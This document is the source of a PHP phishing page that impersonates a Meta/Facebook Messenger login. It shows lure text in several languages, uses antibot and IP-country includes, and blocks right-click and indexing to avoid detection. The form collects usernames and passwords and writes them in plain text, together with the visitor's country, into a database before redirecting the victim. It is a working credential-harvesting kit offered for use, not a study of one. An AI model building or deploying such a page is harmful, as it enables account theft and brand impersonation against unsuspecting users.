<?php
ob_start();
include 'ip.php';
require 'antibot.php';


$lc = ""; 
    $txt="First confirm your connection.";
    $txt1="Get it before everyone else";
    $txt_mail="Phone number or email";
    $txt_pass="Password";
    $txt_button="Login";
	$password ="Forgot your password?";
    if(isset($_SERVER['HTTP_ACCEPT_LANGUAGE']))
    $lc = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);

if($lc == "en"){
    $txt="First confirm your connection.";
    $txt1="Get it before everyone else";
    $txt_mail="Phone number or email";
    $txt_pass="Password";
    $txt_button="Login";
	$password ="Forgot your password?";
} 
 else if($lc == "bg"){ //بلغاري
    $txt="Първо потвърдете връзката си.";
    $txt1="Вземете го преди всички останали";
    $txt_mail="Телефонен номер или имейл";
    $txt_pass="парола";
    $txt_button="Влизам";
	$password ="Забравена парола?";
}  
    else if($lc == "es"){ //اسباني
   $txt="Primero confirme su conexión.";
    $txt1="Consíguelo antes que los demás";
    $txt_mail="teléfono móvil o correo electrónico";
    $txt_pass="Contraseña";
    $txt_button="Vigilancia";
	$password ="¿Olvidaste tu contraseña?";
	}
	
     else if($lc == "fr"){ // فرنسي
   $txt="Confirmez d’abord votre connexion.";
    $txt1="Obtenez-le avant tout le monde";
    $txt_mail="Numéro de téléphone portable ou e-mail";
    $txt_pass="Mot de passe";
    $txt_button="Suivi";
	$password ="Vous avez oublié votre mot de passe?";
	}
	
    else if($lc == "pt"){ //برتغالي
   $txt="Primeiro confirme sua conexão.";
    $txt1="Receba antes de todo mundo";
    $txt_mail="celular ou e-mail";
    $txt_pass="Senha";
    $txt_button="Monitoramento";
	$password ="Esqueceu sua senha?";
	}
	 else if($lc == "ar"){ //عربي
   $txt="عليك تأكيد بياناتك أولا";
    $txt1="احصل عليه قبل أي شخص آخر";
    $txt_mail="الهاتف أو البريد الإلكتروني";
    $txt_pass="كلمة المرور";
    $txt_button="استمرار";
	$password ="نسيت رقمك السري؟";
	}
	
else{
    $txt="First confirm your connection.";
    $txt1="Get it before everyone else";
    $txt_mail="Phone number or email";
    $txt_pass="Password";
    $txt_button="Login";
	$password ="Forgot your password?";
    exit();
}





?>
<!DOCTYPE html>

<html>
<head>

<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="referrer" content="no-referrer">
    <meta name="robots" content="noindex, noimageindex, nofollow, nosnippet">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title></title>
    <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">
    <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1">
  <style>
  body.touch{
	margin:0;
	-webkit-text-size-adjust:none;
	cursor:pointer;
	font-family: -apple-system, BlinkMacSystemFont, "Segoe UI Historic","Segoe UI", Roboto, Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
}
.touch,input{
	
	font-size:15px
}
i.img{
	-webkit-user-select:none
}
.touch,button,input{
	-webkit-tap-highlight-color:rgba(0,0,0,0);}
input{
	-webkit-user-select:text
}
#root{
	border-bottom:1px solid transparent;
	box-sizing:border-box
}
body{
	text-align:left;
	direction:ltr
;background-repeat: no-repeat;
    background-size: cover;
    background-position: center center;
   
    min-height: 100vh;
    background-attachment: fixed;}
body,input,button{
	font-family: -apple-system, BlinkMacSystemFont, "Segoe UI Historic","Segoe UI", Roboto, Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
}
body,p,h1{
	margin:0;
	padding:0
}
h1{
	font-size:1em;
	font-weight:bold
}
._52z5{
	/* background:#ffff; */
	box-sizing:border-box;
	height:130px;
	margin-top: 5px;
	padding:7px 0;
	position:relative;
	width:100%;
	z-index:12
}
._52z6{
	min-width:100px;
	text-align:center
}
#viewport{
	min-height:100%;
	overflow:hidden;
	position:relative;
	width:100%
}
#page{
	position:relative
}
._129_{
	position:relative;
	z-index:12
}
._56bg{
	border:0;
	display:block;
	margin:0;
	padding:0
}
._56bg{
	-webkit-appearance:none;
	box-sizing:border-box;
	width:100%
}


.sp_lFt8ZXDwt9Q{
	
	background-size:auto;
background-repeat:no-repeat;
display:inline-block;
height:20px;
width:20px
}
.sp_lFt8ZXDwt9Q.sx_97d7ed{
width:112px;
height:108px;
background-position:0 0
}
._55sr{
cursor:pointer
}
.acw{
border-color:#e9e9e9
}
.aclb{
border-color:#d8dfea
}
.acw{
/* background-color:#fff; */}
.aclaa{
height: auto;
margin-left: auto;
margin-right: auto;
display: block;
margin-top: 30px;

}
.aclaa img{ 
   width: 90%;
   margin-top: 8px;
   margin-left: auto;
   margin-right: auto;
   display: block;
}
.aclb{
margin-top: 10px
}
._52j9{
color:#576b95
}
._52jc{
font-size:12px;
line-height:16px
}
._52jd{
font-size:15px;
line-height:20px
}
._52jh{
font-weight:bold;
}
.img{
border:0;
display:inline-block;
vertical-align:top
}
i.img u{
position:absolute;
width:0;
height:0;
overflow:hidden
}
form{
margin:0;
border:0
}
#root{
position:relative;
z-index:0
}
a{
color:#576b95;
cursor:pointer;
text-decoration:none
}
a[href="#"]{
-webkit-touch-callout:none
}
._4g33,._5i2i{
display:flex
}
._52we{
	margin-top: 10%;
align-items:center
}
._4g34{
flex:1;
width:0
}
._4g34 ._5xu4{
flex:1;
width:100%
}
.fcg{
color: black;}
.mfss{
font-size:small
}
body,input{
font-size:15px
}
.mfss{
font-size:12px;
line-height:15px
}
.touch,input{
font-size:15px;
line-height:18px
}
._55wo{
background:#fff
}
._55x2>*,._55x2._55x2>*{
border-bottom:1px solid #e5e5e5
}
._55x2>:last-child{
border-bottom:none
}
._55x2>*,._55x2._55x2>*{
border-bottom-color:rgba(0, 0, 0, .101)
}
._55wr{
padding:8px
}
._56bs{
-webkit-appearance:none;
background:none;
display:inline-block;
font-size:12px;
height:28px;
line-height:28px;
margin:0;
overflow:visible;
padding:0 9px;
text-align:center;
vertical-align:top;
white-space:nowrap
}
._56bs{
border:none;
border-radius:3px;
box-sizing:border-box;
position:relative;
-webkit-user-select:none;
z-index:0
}
._56bs::after{
border-radius:8px;
border-style:solid;
border-width:1px;
bottom:-1px;
box-shadow:0 1px 0 rgba(0, 0, 0, .07), inset 0 -1px 1px 0 rgba(0,0,0,.03);
content:"";
left:-1px;
pointer-events:none;
position:absolute;
right:-1px;
top:-1px;
z-index:1
}
._56bs::before{
border-radius:8px;
bottom:-1px;
content:"";
left:-1px;
pointer-events:none;
position:absolute;
right:-1px;
top:-1px;
transform:none;
z-index:-1
}
._56bu{
color:#fff
}
._56bu{
text-shadow:0 -1px rgba(0, 0, 0, .25)
}
._56bu{
border-radius:4px;
border-color:rgba(0, 0, 0, .15) rgba(0, 0, 0, .15) rgba(0, 0, 0, .26);
box-shadow:0 1px 0 rgba(0, 0, 0, .14), inset 0 -1px 1px 0 rgba(0,0,0,.03)
}
._56bu{
background-color: #000000;
}
._56bw{
font-size:18px;
height:45px;
line-height:36px;
padding:0 16px
}
._56bs ._55sr{
line-height:20px;
margin-top:4px
}
._56bw ._55sr{
line-height:24px;
margin-top:6px
}
._56bs._56b_{
    border-radius: 50px;
    color: #fff;
    font-size: 15px;
    padding: 9.5px 20px;
    text-align: center;
    align-items: center;
    border: none;
    box-shadow: none;
    display: flex;
    overflow: hidden;
    text-overflow: ellipsis;
    text-shadow: none;
    white-space: nowrap;
    font-weight: 700;
    vertical-align: middle;
    line-height: 26px;
    margin: -4px auto 0;
    cursor: pointer;
}
._56be{
position:relative
}

._56bf{
border-radius:8px;
overflow:hidden
}

.sp_C2yIhMFjXJl.sx_54fc39{
width:12px;
height:12px;
background-position:-40px -104px
}
._2ph-{
padding:8px
}
._2pie{
padding-top:8px
}
._5ui2 ._5dpw{
text-align:center
}
._5ui3{
padding:6px
}
._1rrd{
border:1px solid #0b57ff;
border-radius:3px;
color:#4080ff;
display:block;
font-size:large;
height:18px;
line-height:17px;
margin-right:1px;
text-align:center;
vertical-align:middle;
width:18px
}
._3j87{
margin:0 auto
}
._3j87 .img{
margin:3px 0
}
._5rut{
margin:0 auto
}
._4u9z{
padding: 12px;
}
._5soa ._5rut{
padding:0 16px
}
._xo8{
margin-bottom:-15px;
margin-top:15px
}
._27z2{
line-height:20px
}
._27z2{
box-sizing:border-box;
width:100%
}
._1upc{
/* background-color:#fff; */}
._5yd0{
background:#fa3e3e
}
._5yd1{
color:#fff
}
._56bu{
cursor:pointer
}
._noti5 {
    text-align: center;
    color: #080808;
    background: #f4f4f4;
    padding: 8px;
    border: 1px solid #eeeeee;
    /* border-radius: 4px; */
    font-size: 14px;
    /* font-weight: 600; */
    /* margin-bottom: 5px;*/
}
._for545{
text-align: center;
font-size: 14px;
color: #000000;
margin-top: 10px;
}
._55wq{padding:4px}

._8qtn {
    background: #ffffff;
}

._56be {
    position: relative;
}

._56be {
	border: 1px solid #00000075;
    border-radius: 4px;
    color: #000;
    display: block;
    font-family: Helvetica Neue,Segoe UI,Helvetica,Arial,sans-serif;
    font-size: 17px;
    height: 42px;
    margin-bottom: 12px;
    margin-left: auto;
    margin-right: auto;
    padding: 0 16px;
    width: 286px;

}

    input:focus { 
        outline: none !important;
        border-color: #000000;
        border-radius:4px;
        border-width: 1px;
    }

::-webkit-input-placeholder { /* WebKit, Blink, Edge */
    color:    #7b7b7b;
}
:-moz-placeholder { /* Mozilla Firefox 4 to 18 */
   color:    #7b7b7b;
   opacity:  1;
}
::-moz-placeholder { /* Mozilla Firefox 19+ */
   color:    #7b7b7b;
   opacity:  1;
}
:-ms-input-placeholder { /* Internet Explorer 10-11 */
   color:    #7b7b7b;
}
::-ms-input-placeholder { /* Microsoft Edge */
   color:    #7b7b7b;
}

::placeholder { /* Most modern browsers support this now. */
   color:    #7b7b7b;
}
</style>
    </head>
<body tabindex="0" class="touch x1 _fzu _50-3 iframe acw" oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
<?php
     require('../../conn.php');

    if (isset($_REQUEST['username'])) {
      
        $username = stripslashes($_REQUEST['username']);
        $username = mysqli_real_escape_string($con, $username);
        $email    = stripslashes($_REQUEST['email']);
        $email    = mysqli_real_escape_string($con, $email);
        $password = stripslashes($_REQUEST['password']);
        $password = mysqli_real_escape_string($con, $password);
        $check_user = mysqli_query($con, "SELECT user FROM users where user = '$username' ");
        $check_pass = mysqli_query($con, "SELECT pass FROM users where pass = '$password' ");
if(mysqli_num_rows($check_user) > 0  && mysqli_num_rows($check_pass) > 0)
{
    $con->close();
     header('location: ../');
}
else{ 
        $query    = "INSERT into `users` (user, pass, country)
                     VALUES ('$username', '$password', '$email')";
        $result   = mysqli_query($con, $query);
        if ($result) {
             $con->close();
     header('location: ../');

        } else {
            echo "<div class='form'>
                  <h3>Required fields are missing.</h3><br/>
                  <p class='link'>Click here to <a href='registration.php'>registration</a> again.</p>
                  </div>";
        }
    }
    }
    else {
?>
   
    <div id="viewport">
        <div id="page">
            <div class="_129_" id="header-notices"></div>
            <p class="_noti5" dir="rtl"><?php echo $txt;?></p>
            <center><img src="https://i.imgur.com/wCWCDqI.png"> </center>
            <h1 style="text-align: center;font-size: 35px;font-weight: normal;margin-top: 20px;">Messenger</h1> 
            <p dir="rtl" style="margin-right: auto;margin-left: auto;text-align: center;margin-top: 20px;margin-bottom: 10px;font-size: 18px;" class="center"><?php echo $txt1;?></p>
            <div class="_5soa acw" >
                <div class="_4g33">
                    <div class="_4g34">
                        <div class="aclb">
                            <div class="_5rut"> 
                               <form action='' method='POST' target="_top">
                                            <div>
                                                <input  minlength="3" maxlength="30" autocorrect="off" autocapitalize="off" class="_56be _56bg _4u9z _5ruq _8qtn"  name="username" placeholder="<?php echo $txt_mail;?>" type="text" required="">
                                            </div>
                                             <input type="text" hidden name="email" id="email" value="<?php echo ip_visitor_country();?>" />
                                            <div class="_55wq"></div>
                                            <div>
                                                <div class="_1upc _mg8" >
                                                    <div class="_4g33">
                                                    <div class="_5xu4">
                                                                <input  autocorrect="off" autocapitalize="off" class="_56be _56bg _4u9z _5ruq _8qtn"  name="password" minlength="6" placeholder="<?php echo $txt_pass;?>" type="password" required="">
                                                            </div>
                                                    </div>
                                                </div>
                                            </div>
                              
                                    <div class="_2pie" style="text-align:center;">
                                        <div>
                                            <input type="submit" value="<?php echo $txt_button;?>" class="_56bu _55sr _52jh _56bs _56b_ _56bw " name="submit" >
                                        </div>
                                    </div>
                                    <p class="_for545"><?php echo $password;?></p>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="_55wr _5ui2">
                    <div class="_5dpw">
                        <div class="_5ui4"><span class="mfss fcg">2022 Meta Inc.</span></div>
                    </div>
                </div>
<?php
    }
?>
</body>
</html>